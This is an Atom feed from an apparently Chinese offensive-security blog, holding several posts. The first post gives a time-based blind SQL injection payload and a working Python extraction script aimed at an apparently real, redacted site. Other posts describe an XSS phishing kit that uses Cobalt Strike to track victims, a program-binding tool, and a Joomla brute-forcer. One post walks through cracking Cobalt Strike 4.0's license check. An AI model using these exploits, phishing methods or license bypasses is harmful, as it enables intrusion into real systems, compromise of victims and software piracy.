<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://thekingofduck.github.io</id>
    <title>CoolCat&apos; Blog</title>
    <updated>2020-10-24T15:02:13.849Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://thekingofduck.github.io"/>
    <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
    <subtitle>当代废物</subtitle>
    <logo>https://thekingofduck.github.io/images/avatar.png</logo>
    <icon>https://thekingofduck.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, CoolCat&apos; Blog</rights>
    <entry>
        <title type="html"><![CDATA[极端条件下时间盲注加速的另一种思路]]></title>
        <id>https://thekingofduck.github.io/post/sql-inject-bypass/</id>
        <link href="https://thekingofduck.github.io/post/sql-inject-bypass/">
        </link>
        <updated>2020-10-24T11:27:33.000Z</updated>
        <content type="html"><![CDATA[<p>摸底情况</p>
<p>环境:<code>python</code>+<code>django</code>+<code>pymysql</code></p>
<p>注入点应该是出现在order by 后面,无回显,程序会分离<code>;</code>符号,并当做两个语句来执行,也就是存在堆叠注入,丢给sqlmap跑确实也识别出来了,但是没法正常跑数据,人工探测发现mysql字符处理相关的函数均无法正常执行(过滤or写法问题?),离谱的是ifnull这类函数都无法执,探测下来已知的可执行的函数只有<code>sleep()</code>,<code>length()</code>,<code>users()</code>,<code>version()</code>等这类可执行。</p>
<p>只能时间盲注没得选,绕过也容易,payload如下:</p>
<pre><code>select case when((select binary database()) like &quot;test%&quot;)then sleep(3) else sleep(0) end;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1603551425773.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1603551438310.jpg" alt="" loading="lazy"></figure>
<p>不允许操作字符那就不操作,只对比就好。写完Poc产生一个问题。平常盲注都是查询出单个字符串再去和所有字符串对比,但如果把模糊查询条件改成<code>like &quot;%a%&quot;</code>,先查询一下所有字符串字符串，看是否在目标字段中,并将存在于目标字段中的字符聚合起来,再用<code>like &quot;abc%&quot;</code>去将存在的字符串进行排序,效率会不会高很多？</p>
<p>假设查询结果为:<code>95b17c3b195983f7ef37358a6db07e35</code><br>
不考虑特俗字符串,盲注情况以下62个字符串需要对比:</p>
<pre><code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
</code></pre>
<p>不适应任何技巧情况下最多需要需要对比32x62=1984次</p>
<p>先将查询结果转成ASCII码,上诉62个字符的ASCII码进行二分法对比,最多需要对比ln62/ln2*32≈192次</p>
<p>使用上诉思路查询最多次数为62 + 14*32 = 510,其中14为查询结果中出现的14个独立字符串,假设值为<code>00000000000000000000000000000000</code>时，最坏查询次数为62 + 1*32 = 94,也就是说查询结果重复得越多查询次数越少,正常情况下还是不如转ascii再二分法对比效果好,但如果遇到这种不能分割字符串的情况,这也不失是个方法。</p>
<p>demo:</p>
<pre><code>import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
  &quot;http&quot;:  &quot;http://127.0.0.1:8080&quot;,
  &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;,
}

def sqli(payload):

    session = requests.Session()

    paramsGet = {
        &quot;dxxxxx&quot;: &quot;xxxx');{}&amp;&quot;.format(payload)}
    headers = {&quot;Connection&quot;: &quot;close&quot;,
               &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; pt-br) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13&quot;,
               &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;}
    cookies = {&quot;SESSION&quot;: &quot;r5q1phi49syxxxxxxxxxxxxxxxxxxxxxxxxxxxxrod59m3u2t&quot;}

    try:
        session.get(&quot;https://xxxxxxxxxxxxxxxxxxxxxxch&quot;, params=paramsGet,
                               headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=3)
        return False
    except:
        return True


if __name__ == '__main__':


    #select case when((select database()) like \&quot;%%\&quot;)then sleep(2) else sleep(0) end;
    existStrs = &quot;&quot;

    strs = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@.ß&quot;
    print(&quot;[+] 正在遍历返回值中存在的字符串...&quot;)
    for s in strs:
        payload = &quot;select case when((select binary user()) like \&quot;%{}%\&quot;)then sleep(2) else sleep(0) end;&quot;.format(s)
        if sqli(payload):
            existStrs += s
            print(existStrs)

    print(&quot;[+] 返回值中存在的字符串共有: {}&quot;.format(existStrs))
    print(&quot;[+] 返回值排序中...&quot;)

    result = &quot;&quot;

    for num in range(1,15):
        tmp = &quot;&quot;
        for s2 in existStrs:
            tmp = result + s2
            payload2 = &quot;select case when((select binary user()) like \&quot;{}%\&quot;)then sleep(2) else sleep(0) end;&quot;.format(tmp)
            if sqli(payload2):
                result += s2
                break
        print(result)
    print(&quot;[+] 返回值: {}&quot;.format(result))

</code></pre>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1603551452123.jpg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[captcha-killer修改随笔]]></title>
        <id>https://thekingofduck.github.io/post/recode-captcha-killer/</id>
        <link href="https://thekingofduck.github.io/post/recode-captcha-killer/">
        </link>
        <updated>2020-08-08T09:50:14.000Z</updated>
        <content type="html"><![CDATA[<p>成品如下:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1596880625428.png" alt="" loading="lazy"></figure>
<p>新增功能特性:<br>
1.当验证码结果返回值非图标时，使用自定义正则匹配验证码位置。<br>
2.当识别出匹配结果为图标时自动锁定正则输入框以及匹配按钮。<br>
3.针对团队购买的识别接口返回值预设正则, etc...</p>
<p>适应新场景：<br>
requests:</p>
<pre><code>GET /xxxx.ashx?op=getVerifyCodeImage HTTP/1.1
Host: www.baidu.com
</code></pre>
<p>response:</p>
<pre><code>{&quot;success&quot;:true,&quot;image&quot;:&quot;图标的base64值&quot;}
</code></pre>
<p>输入正则:</p>
<pre><code>&quot;success&quot;:true,&quot;image&quot;:&quot;(.*?)&quot;
</code></pre>
<p>即可正常识别。</p>
<p>修改过的位置<br>
<img src="https://thekingofduck.github.io/post-images/1596881092380.png" alt="" loading="lazy"></p>
<p>如图中代码所示，原作者提了一个burp自带的发包，无法指定超时这个问题，有趣的是自己印象中超时一直都是再Intruder的超时是可以在option中指定的。</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1596881494055.jpeg" alt="" loading="lazy"></figure>
<p>认真看了一下pause before retry和超时没半毛钱关系，一直以来都看错了...</p>
<p>问题其实出在MorePayloads的判断上，原代码未判断是否有新的payload生成，直接无条件的返回true，这一来即便请请求第三方网站的识别结果尚未回来，burp也认为有新的Payload生成了，直接调自然就只能返回空了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Copy2Yaml:一键生成yaml poc]]></title>
        <id>https://thekingofduck.github.io/post/copy2yaml/</id>
        <link href="https://thekingofduck.github.io/post/copy2yaml/">
        </link>
        <updated>2020-06-27T16:38:24.000Z</updated>
        <content type="html"><![CDATA[<p>初次使用JavaFX，不得不说体验比swing强太多了。</p>
<p>开发过程忘记了burp是swing画的GUI，调试卡了好久，难受啊。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1593276055852.jpg" alt="" loading="lazy"></figure>
<p>对标xray的poc来开发的，虽然兼容但是不是写给xray用的。</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1593276097179.jpg" alt="" loading="lazy"></figure>
<p>写了支持终端模式，burp插件模式，在或者直接打开复制粘贴数据包也是可以的，又是写bug的一天。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MatryoshkaDollTool-一款程序捆绑工具]]></title>
        <id>https://thekingofduck.github.io/post/MatryoshkaDollTool/</id>
        <link href="https://thekingofduck.github.io/post/MatryoshkaDollTool/">
        </link>
        <updated>2020-05-23T15:33:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="what">WHAT</h3>
<p>一款程序捆绑工具，取名MatryoshkaDollTool，也叫俄罗斯套娃工具。</p>
<p>开源这个只有基础捆绑功能的版本，给套娃程序添加自启以及加密功能的版本哪天高兴了就开源。</p>
<h3 id="why">WHY</h3>
<p>找不到好用的没后门的捆绑工具所以自己动手写了。</p>
<h3 id="how">HOW</h3>
<figure data-type="image" tabindex="1"><img src="https://github.com/TheKingOfDuck/MatryoshkaDollTool/blob/master/img/screenshot.png" alt="" loading="lazy"></figure>
<h3 id="where">WHERE</h3>
<p>成品在bin目录下。</p>
<h3 id="todo-list">TODO List</h3>
<ul>
<li>把目前的壳变成真壳。</li>
<li>开放添加套娃的自启，加密。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSS-Fishing2-CS：钓鱼自动收杆指南]]></title>
        <id>https://thekingofduck.github.io/post/XSS-Fishing2-CS/</id>
        <link href="https://thekingofduck.github.io/post/XSS-Fishing2-CS/">
        </link>
        <updated>2020-04-19T14:23:30.000Z</updated>
        <content type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~</p>
<p>项目地址：<a href="https://github.com/TheKingOfDuck/XSS-Fishing2-CS">XSS-Fishing2-CS</a></p>
<p>使用场景：使用xss弹窗提示钓鱼的时候会面临这样一个问题，如果鱼儿已经上线了，页面那边还在不停的弹窗，很容易引起鱼儿怀疑，权限说没就没了。</p>
<h3 id="开发">开发</h3>
<p>cs插件:<br>
<img src="https://thekingofduck.github.io/post-images/fishing2.png" alt="" loading="lazy"></p>
<p>没啥难度，都是照着官方函数库复制...魔性的是我的ubantu死活跑不起来，centos可以...</p>
<p>php端：<br>
<img src="https://thekingofduck.github.io/post-images/fishing1.png" alt="" loading="lazy"><br>
都是基本 语法，基本逻辑，但是遇到一个有趣的弱类型问题：</p>
<pre><code>fwrite(&quot;ips.txt&quot;, &quot;127.0.0.1&quot;);
</code></pre>
<p>写入的结果是127，之后的内容会被当做小点数被忽略掉，所以图中代码那个base64并非我闲着没事做...</p>
<h3 id="使用">使用</h3>
<p>1.将xss.php放到自己的服务器上去并修改第三行的钓鱼Payload。</p>
<p>2.修改xssFisher.cna第4行中的企业微信机器人的密钥，第23行中的xss.php的实际地址。</p>
<p>3.加载cs插件，将xss的Payload插入目标页面。</p>
<h3 id="特点">特点</h3>
<p>1.企业微信上线提示</p>
<p>2.机器上线后立即停止钓鱼的弹窗</p>
<p>3.只停止单个IP的弹窗，其他IP仍然可以继续弹窗，继续上线。</p>
<h3 id="todo">TODO</h3>
<p>1.特定网段上线的问题（？这个场景没有很清楚）<br>
2.内网ip也判断下，避免出现多个目标在一个小的局域网共用一个外网IP，其中一台上线后其他机器就不弹窗了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Copy2Java：在Burp中一键生成Java代码]]></title>
        <id>https://thekingofduck.github.io/post/Copy2Java/</id>
        <link href="https://thekingofduck.github.io/post/Copy2Java/">
        </link>
        <updated>2020-04-12T17:18:19.000Z</updated>
        <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/TheKingOfDuck/Copy2Java">https://github.com/TheKingOfDuck/Copy2Java</a></p>
<h3 id="0x01-初始化">0x01 初始化</h3>
<p>先说说为什么要用Java写这个插件？为什么要生成的是Java的代码。</p>
<p>1.简化安全从业者用Java写web漏洞利用工具的流程。</p>
<p>2.其他语言有插件实现了，生成现成的JAVA代码可在强迫自己使用Java的同时也不会拉低效率。</p>
<h3 id="0x02-加载中">0x02 加载中</h3>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413020409078.png" alt="image-20200413020409078" loading="lazy"></figure>
<p>代码写完回头再看除了感觉辣鸡没什么太多其他感觉，过程中最麻烦的是画GUI，intellj拖控件有点恶心，eclipse拖好后再复制回intellj即可。在http发包方面目前用过的最方便的是HttpRequest，所以生成的代码依赖也选择它，打包在了项目的lib目录，导入即可。</p>
<h3 id="0x02-加载成功">0x02 加载成功</h3>
<p>使用:</p>
<p>1.加载插件：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413021026557.png" alt="image-20200413021026557" loading="lazy"></figure>
<p>2.在burp的repeater中点击Copy2Java菜单：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413021159116.png" alt="image-20200413021159116" loading="lazy"></figure>
<p>3.设置是否开启代理【可选】：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413021244692.png" alt="image-20200413021244692" loading="lazy"></figure>
<p>默认是不开代理的，没需要的话这部可以跳过。</p>
<p>4.点击步骤3中弹出的窗口中的Copy to clipboard按钮复制代码并粘贴到ide:</p>
<p>添加插件lib目录下的依赖包</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413021640508.png" alt="image-20200413021640508" loading="lazy"></figure>
<p>完成</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413022210153.png" alt="image-20200413022210153" loading="lazy"></figure>
<p>如何高效的写一个web相关漏洞的利用工具？</p>
<p>1.新建mvn项目，并将生成的代码复制进来。</p>
<p>2.修改传入的参数，mvn package快速打包。</p>
<p>比用Python写慢？不存在的！</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/copy2java//image-20200413022944759.png" alt="image-20200413022944759" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[JoomlaCracker: JoomlaCracker CMS 批量爆破工具]]></title>
        <id>https://thekingofduck.github.io/post/JoomlaCracker/</id>
        <link href="https://thekingofduck.github.io/post/JoomlaCracker/">
        </link>
        <updated>2020-04-11T11:44:34.000Z</updated>
        <summary type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~<!-- more --></p>
]]></summary>
        <content type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~<!-- more --></p>
<!-- more -->
<p>项目地址：<a href="https://github.com/TheKingOfDuck/JoomlaCracker">https://github.com/TheKingOfDuck/JoomlaCracker</a></p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1586606413161.png" alt="" loading="lazy"></figure>
<p>使用Java开发，自动提取域名要素，debug在115行设置setProxy(true)即可。</p>
<p>一点点心得：<br>
Joomla和Dede性质差不多，99%的洞都是建立在有后台权限/低用户权限的情况下才能利用，谁日谁知道...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[重写一个burpJsEncrypter]]></title>
        <id>https://thekingofduck.github.io/post/ReCode-A-BurpJsEncrypter/</id>
        <link href="https://thekingofduck.github.io/post/ReCode-A-BurpJsEncrypter/">
        </link>
        <updated>2020-03-22T11:05:56.000Z</updated>
        <summary type="html"><![CDATA[<p>Github:<a href="https://github.com/TheKingOfDuck/burpJsEncrypter">https://github.com/TheKingOfDuck/burpJsEncrypter</a></p>
]]></summary>
        <content type="html"><![CDATA[<p>Github:<a href="https://github.com/TheKingOfDuck/burpJsEncrypter">https://github.com/TheKingOfDuck/burpJsEncrypter</a></p>
<!-- more -->
<h3 id="写在前面">写在前面</h3>
<p>先说说这个项目为什么会出现。<br>
c0ny1师傅写的<a href="https://github.com/c0ny1/jsEncrypter">jsEncrypter</a>其实已经能满足日常需求，我本人也是因为这个项目成为c0ny1师傅的&quot;粉丝&quot;的。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848722634917.jpg" alt="-w814" loading="lazy"></figure>
<p>使用过的师傅都知道这个项目依赖于<code>phantomjs</code>,别人我不知道,我自己老是忘记<code>phantomjs</code>的二进制我放哪儿了,而且每次启动啥的都比较麻烦。</p>
<p>在学习Java的过程中了解到官方在<code>JDK1.6</code>添加了新的<code>ScriptEngine</code>类,允许用户直接执行<code>js</code>代码,也就是说调用<code>phantomjs</code>这件事可以,但是没必要。</p>
<h3 id="代码编写">代码编写</h3>
<p>看看核心的实现方法：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/F1C1AFDB-4EE7-4AB7-86BE-FB54A7462B33.png" alt="F1C1AFDB-4EE7-4AB7-86BE-FB54A7462B33" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/49ADE7CC-F87A-4EFF-A6DD-3A7AD5916D6F.png" alt="49ADE7CC-F87A-4EFF-A6DD-3A7AD5916D6F" loading="lazy"></figure>
<p>调用了加载到内存中的<code>burpJsEncrypter</code>函数,代码如下：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/B43B9A52-8508-4CC2-B058-C06AB5D5B79D.png" alt="B43B9A52-8508-4CC2-B058-C06AB5D5B79D" loading="lazy"></figure>
<p>是不是很简单...</p>
<p>再说说开发过程中遇到的最大的坑。</p>
<p>在代码中调试时使用<code>System.getProperty(&quot;user.dir&quot;)</code>获取当前路径时完全OK的,但是加载到内存后再获取就会变成：</p>
<pre><code>/var/folders/tg/z5wcq7jx3s526hykwz0pz2v00000gp/T/burp8120677802571630018.tmp/22js/
</code></pre>
<p>导致遍历<code>js</code>文件一致失败。</p>
<h3 id="如何使用">如何使用</h3>
<p>1.将本项目的js目录下的<code>js</code>文件复制到用户目录下的<code>/burp/jsFile</code>目录:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848732791664.jpg" alt="-w834" loading="lazy"></figure>
<p>文件名咋命名完全无所谓,但是main.js中<code>burpJsEncrypter</code>函数一定要有,需要人工修改的加密逻辑也就是注释中间的内容：</p>
<pre><code>//Java调用的主函数
function burpJsEncrypter(rawPayload){

	var encryptedPayload;


	//===============加密开始=================

	encryptedPayload = hex_md5(rawPayload);

	//===============加密结束=================

	return encryptedPayload;
}
</code></pre>
<p>如上面的代码中的hex_md5函数是加载到内存中的其他js文件中的函数。实战中只需要把页面中所有涉及加密的js文件下载到这个目录即可。</p>
<p>2.设置Payload处理：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/08B84570-D584-4265-9505-27D7F5821E24.png" alt="08B84570-D584-4265-9505-27D7F5821E24" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848737403466.jpg" alt="-w647" loading="lazy"></figure>
<p>选完再开始爆破即可。</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848739154768.jpg" alt="-w973" loading="lazy"></figure>
<p><strong>明文在哪儿看？</strong></p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848741045333.jpg" alt="-w628" loading="lazy"></figure>
<p><strong>支持再Repeater中加密？</strong></p>
<p>选中要加密的字段,右键选择<code>burpJsEncrypter</code>菜单即可。</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848741934886.jpg" alt="-w519" loading="lazy"></figure>
<h3 id="重要提醒">重要提醒</h3>
<p>如果c0ny1师傅那个插件你不会耍的画这个插件你估计也不会耍的,最核心的问题都是找页面中的加密逻辑,然后复制出来运行而已。</p>
<p><strong>即兴开发，Enjoy it~~</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Patch Cobalt Strike 4.0 Stage X64 Bugs]]></title>
        <id>https://thekingofduck.github.io/post/patch-cobalt-strike-40-stage-x64-bugs/</id>
        <link href="https://thekingofduck.github.io/post/patch-cobalt-strike-40-stage-x64-bugs/">
        </link>
        <updated>2020-03-20T09:12:05.000Z</updated>
        <content type="html"><![CDATA[<p>根据出问题的地方<code>Use x64 payload</code>,也就是stage x64生成的exe无法正常运行，跟到:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846865680139.jpg" alt="-w1532" loading="lazy"></figure>
<pre><code>boolean bool1 = DialogUtils.bool(this.options, &quot;x64&quot;);
</code></pre>
<p>如果x64被选择则进入x64生成。</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846867392378.jpg" alt="-w1037" loading="lazy"></figure>
<p>通过代码对比会发现调用的函数都没啥区别。</p>
<pre><code>new ArtifactUtils(this.client).patchArtifact(this.stager, &quot;artifact64.exe&quot;, paramString);
</code></pre>
<p>跟过来发现两个<code>patchArtifact</code>的重载方法：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846873782080.jpg" alt="-w827" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846874079370.jpg" alt="-w886" loading="lazy"></figure>
<p>可以发现，整个过程中都没有涉及到传递<code>stage</code>的架构,基本即可以断定和这中间环节没关系了。</p>
<p>继续跟到最终环节:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846898933890.jpg" alt="-w946" loading="lazy"></figure>
<p>细节出来了有没有：</p>
<pre><code>this.stager = ListenerUtils.getListener(this.client, str1).getPayloadStager(&quot;x86&quot;);
</code></pre>
<p>明显官方将<code>stage</code>固定在了x86的,所以把x64的payload写进来自然就不对了。</p>
<p><strong>验证</strong></p>
<p>将86修改为64：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846900913944.jpg" alt="-w843" loading="lazy"></figure>
<p>重新打包运行：</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846902345978.jpg" alt="-w399" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846902520176.jpg" alt="-w845" loading="lazy"></figure>
<p>至于完整的代码怎么调整,就自己考虑咯...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Patch Cobalt Strike 4.0]]></title>
        <id>https://thekingofduck.github.io/post/Patch-Cobalt-Strike-4.0/</id>
        <link href="https://thekingofduck.github.io/post/Patch-Cobalt-Strike-4.0/">
        </link>
        <updated>2020-03-18T22:56:21.000Z</updated>
        <content type="html"><![CDATA[<p>拿到得程序如下:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845637149700.jpg" alt="-w270" loading="lazy"></figure>
<p>压缩包里面存在附一条启动命令：</p>
<pre><code>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar $*
</code></pre>
<p>启动报错：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845638463523.jpg" alt="-w320" loading="lazy"></figure>
<p>这里的说的<code>authorization file</code>明显就是<code>cobaltstrike.auth</code>了</p>
<p>简单搜一下：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845639620558.jpg" alt="-w476" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845665841791.jpg" alt="-w1323" loading="lazy"></figure>
<p>把代码都复制过来，处理下报错：</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845665605145.jpg" alt="-w1586" loading="lazy"></figure>
<p>调用：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845666707405.jpg" alt="-w454" loading="lazy"></figure>
<p>上来就先<code>Invalid authorization file</code>了<br>
明显resources/authkey.pub没有加载过来。</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845671915765.jpg" alt="-w1527" loading="lazy"></figure>
<p>改一下：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845673713054.jpg" alt="-w1176" loading="lazy"></figure>
<p>给出得密钥文件运行到这里就直接return结束了。</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/2F39DF26-A29B-46EA-9F12-129C8D383DEB.png" alt="2F39DF26-A29B-46EA-9F12-129C8D383DEB" loading="lazy"></figure>
<p>既然等于0就结束了，那么把这里得0修改成其他值是不是就可以了？(cs3就是这个破解思路)</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845696379774.jpg" alt="-w316" loading="lazy"></figure>
<p>明显是不得行的。在License方法中有校验：</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845696241758.jpg" alt="-w907" loading="lazy"></figure>
<p>checkLicenseGUI函数得第一个判断就是检测凭证是否有效。值来源于:</p>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845698414371.jpg" alt="-w277" loading="lazy"></figure>
<p>对应修改一下：</p>
<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845737520463.jpg" alt="-w277" loading="lazy"></figure>
<p>然后提示过期:</p>
<figure data-type="image" tabindex="14"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845700315413.jpg" alt="-w483" loading="lazy"></figure>
<p>懒人得做法：直接将这个判断删掉。</p>
<figure data-type="image" tabindex="15"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845706501051.jpg" alt="-w1018" loading="lazy"></figure>
<p>改完就可以直接进加载出UI来了。<br>
<img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/67ADD37F-7926-40B1-9AC8-AFAFFF6ECB0E.png" alt="67ADD37F-7926-40B1-9AC8-AFAFFF6ECB0E" loading="lazy"></p>
<p>对应的也报了不少错误，并不能正常运行...说明还有多处校验了.</p>
<p>这种动不动就删减代码的破解方式自然不是最佳方案。</p>
<p>回归到：</p>
<figure data-type="image" tabindex="16"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845710917584.jpg" alt="-w904" loading="lazy"></figure>
<p>既然是因为密钥文件不对而导致的这里对比失败,那么直接硬写一条正确的结果进去即可:</p>
<figure data-type="image" tabindex="17"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845712703919.jpg" alt="-w1007" loading="lazy"></figure>
<p>比如：</p>
<figure data-type="image" tabindex="18"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/C4C0BB95-040B-46B2-9C01-DE985474A38A.png" alt="C4C0BB95-040B-46B2-9C01-DE985474A38A" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845720512205.jpg" alt="-w1236" loading="lazy"></figure>
<p>至于这个正确的结果如何拿到，就得感谢有花钱购买以及分享出来的师傅了给予白嫖的机会了。</p>
<figure data-type="image" tabindex="20"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845719954394.jpg" alt="-w955" loading="lazy"></figure>
<p>去除exit暗桩：</p>
<figure data-type="image" tabindex="21"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/1.png" alt="-w955" loading="lazy"></figure>
<p>指纹似乎不存在，listener问题也不存在。</p>
<p>阿门，原谅我没钱只能白嫖了...</p>
]]></content>
    </entry>
</feed>